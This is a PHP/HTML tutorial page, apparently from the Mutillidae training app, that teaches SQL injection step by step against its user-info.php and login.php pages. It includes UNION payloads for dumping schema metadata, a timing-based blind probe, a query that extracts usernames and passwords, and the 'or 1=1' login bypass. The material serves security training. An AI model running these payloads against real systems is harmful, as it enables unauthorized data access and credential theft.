<?php 
/*
 * @author: Jeremy Druin
*/ 
?>

<div>&nbsp;</div>
<table class="tutorial">
	<tr class="tutorial-title">
		<td colspan="10">SQL Injection Tutorial</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>Reconnaissance: Error messages can be excellent sources of information. 
		Developers are often naive about error messages and allow their apps to display 
		errors rather than log the errors privately or email them to support staff. Secure
		sites use custom error pages that display no error messages. 
		Finding an error message with respect to SQLi typically involves malforming the
		query on purpose. Special characters can get the job done. Single-quotes and 
		parenthesis often cause errors in SQL Server, Oracle and MySQL databases. Dont
		forget to use different encodings of each character to see if that makes a difference.
		For example, try URL encoding, hex, etc. Try those
		first, then move onto any character that is not alpha-numeric. 
		</td>
	</tr>
	<tr>
		<td>
		Hint: Go to the documentation for ANSI-SQL, Oracle, SQL Server, and MySQL to see which characters 
		are reserved in those respective systems. (ANSI-SQL is the "common" SQL shared by all compliant databases.) 
		In particular, determine what are the comment symbols for the respective systems.
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
		Reconnaissance: Try to find out what type of database is behind the application. Knowing
		if the database is Oracle, SQL Server, or MySQL can help a lot. Each has its own meta-tables,
		functions, system tables, system procedures, and vulnerabilities. If the database is SQL Server 
		or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. 
		They both implement this SQL-92 standard structure. Oracle uses non-standard 
		"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
		at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>. 
		</td>
	</tr>
	<tr>
		<td>
		Reconnaissance: Sometimes the type of database can be infered by its behavior. For example, 
		SQL Server and MySQL both use "--" (double-hyphen) as the comment symbols; however,
		MySQL requires a space betwwen the comment symbol and the next character.
		<br /><br />
		This statement is a valid SQL injection against either SQL Server or MySQL:
		<code>
		 	' union select/**/name/**/FROM/**/INFORMATION_SCHEMA.TABLES-- 
		</code>
		<br /><br />
		MySQL can be identified by whether the injection requires a space on the end. Oracle
		and SQL Server do not care if there is a space at the end of the injection or not. But
		MySQL needs the space on the end. (At least when used with PHP.)
		<br /><br />
		<code>
		 	' union select name FROM INFORMATION_SCHEMA.TABLES-- (&lt;-- space required here) 
		</code>
		</td>
	</tr>
	<tr>
		<td>
		Scanning: Get specifications on database software (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	 ' union select null, database(), current_user(), version() -- 
		 </code>
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
		Reconnaissance: Determine the page capibilities. If the page displays database records, standard SQL
		injection is probably the better tool. If the page processes queries but does not display query output
		(i.e. - a login page), then blind SQLi may be the better tool.
		<br/><br/>
		Use the page normally and observe the behavior. For example, log into Mutillidae. Does Mutillidae
		display any information from the database because you log-in? (No)
		What happens when using page user-info.php?
		Does any data displaywhen using page user-info.php? (Yes)
		The login page is likely going to be a better candidate for blind SQL injection while user-info.php
		is likely a better candidate for direct SQL injection. 
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
		Scanning: If the meta-tables are available, they can footprint the database structure making 
		the next steps much more productive.
		<br/><br/>
		Check the documentation for Oracle, MySQL, and SQL Server. Determine the meta-table structures, 
		table/view names, and column names.  If the database is SQL Server 
		or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. 
		They both implement this SQL-92 standard structure. Oracle uses non-standard 
		"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
		at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>.
		</td>
	</tr>
	<tr>
		<td>
		Scanning: Extract table names from database. (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- 
		 </code>
		</td>
	</tr>
	<tr>
		<td>
		Scanning: Extract table columns from database using a single field (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	 ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS-- 
		 </code>
		</td>
	</tr>

	<tr>
		<td>
		Scanning: Extract views from database (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	 ' union select null,concat_ws('.', COALESCE(table_schema,''), COALESCE(table_name,''), COALESCE(view_definition,'')) AS username,null,null from INFORMATION_SCHEMA.VIEWS-- 
		 </code>
		</td>
	</tr>
	<tr>
		<td>
		Scanning: Extract triggers from database (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	 ' union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
		 </code>
		</td>
	</tr>
	<tr>
		<td>
		Scanning: Extract routines/procs from database (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	 ' union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES-- 
		 </code>
		</td>
	</tr>
	<tr>
		<td>
		Scanning: Extract table columns from database (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	 ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
		 </code>
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
			Blind SQL injection does not depend on seeing any resulting records. Instead, page timing 
			can be used.
		</td>
	</tr>
	<tr>
		<td>
		Scanning: Blind SQL Injection/Brute Forcing values (Example Page: login.php)
		<br /><br />
		 <code>
		 	 ' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
		 </code>
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
		Gaining Access: Extract passwords from user table (Example Page: user-info.php)
		<br /><br />
		 <code>
		 	 ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
		 </code>
		</td>
	</tr>
	<tr>
		<td>
			Gaining Access: Using SQL Injection (Page: login.php)
			<br /><br />
		 	<code>
		 	 ' or 1=1 -- 
		 	</code>
		</td>
	</tr>
</table>